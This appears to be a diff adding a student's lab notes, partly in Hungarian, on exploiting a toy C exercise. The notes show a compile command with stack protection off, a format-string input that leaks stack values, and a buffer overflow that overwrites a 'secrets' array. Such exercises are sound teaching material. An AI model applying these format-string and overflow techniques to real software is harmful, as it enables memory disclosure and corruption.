@@ -1,0 +1,28 @@
+gcc -m32 gyak02.c -o gyak02 -DSECRET1=0xDEADBEEF -DSECRET0=0xCAFEBABE -DMESSAGE=\"SomebodyIsReallyCoolAtThis\" -fno-stack-protector
+
+./gyak02
+Give me an input:
+AAAAAAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+AAAAAAAA.00000100.f7715c20.00000003.ff840fc0.07b1ea71.f63d4e2e.f756ded4.f7576c34.f774dd16.0000babe.dead0000.cafe0000.0000beef.00000000.00000000.41414141.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.
+How many favourite hexadecimal numbers do you have?
+10
+Your favourite numbers:
+0=1
+1=1
+2=1
+3=1
+4=1
+5=1
+6=0000babe
+7=dead0000
+8=deadbeef
+9=cafebabe
+
+
+ff840fc0.07b1ea71.f63d4e2e.f756ded4.f7576c34.f774dd16 --> a kedvenc hexa számoknak lefogalalt terület
+0000babe.dead0000.cafe0000.0000beef --> secrets tömb
+
+A kedvenc tömbből buffer overflowal átírjuk a 2-es és 3-es elemeket, miközben ügyelünk arra, hogy a 0 és 1 ugyanaz az érték maradjon, ami volt
+
+A printf(input)-ok segítségével nézzük a verem változásait
+
